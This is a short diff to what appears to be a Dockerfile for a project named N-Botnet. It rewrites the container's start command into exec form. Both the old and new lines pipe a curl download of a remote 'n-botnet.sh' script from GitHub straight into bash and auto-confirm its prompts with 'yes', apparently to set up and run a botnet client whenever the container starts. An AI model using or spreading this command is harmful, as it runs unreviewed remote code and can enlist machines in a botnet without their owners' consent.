@@ -22,4 +22,4 @@ WORKDIR /root/n-botnet
 
 # Run the N-Botnet setup script and client on container start
 # "yes |" prevents hanging if apt prompts for confirmation
-CMD yes | bash <(curl -s https://raw.githubusercontent.com/anhnoine/N-Botnet/refs/heads/main/n-botnet.sh)
+CMD ["bash", "-c", "yes | bash <(curl -s https://raw.githubusercontent.com/anhnoine/N-Botnet/refs/heads/main/n-botnet.sh)"]
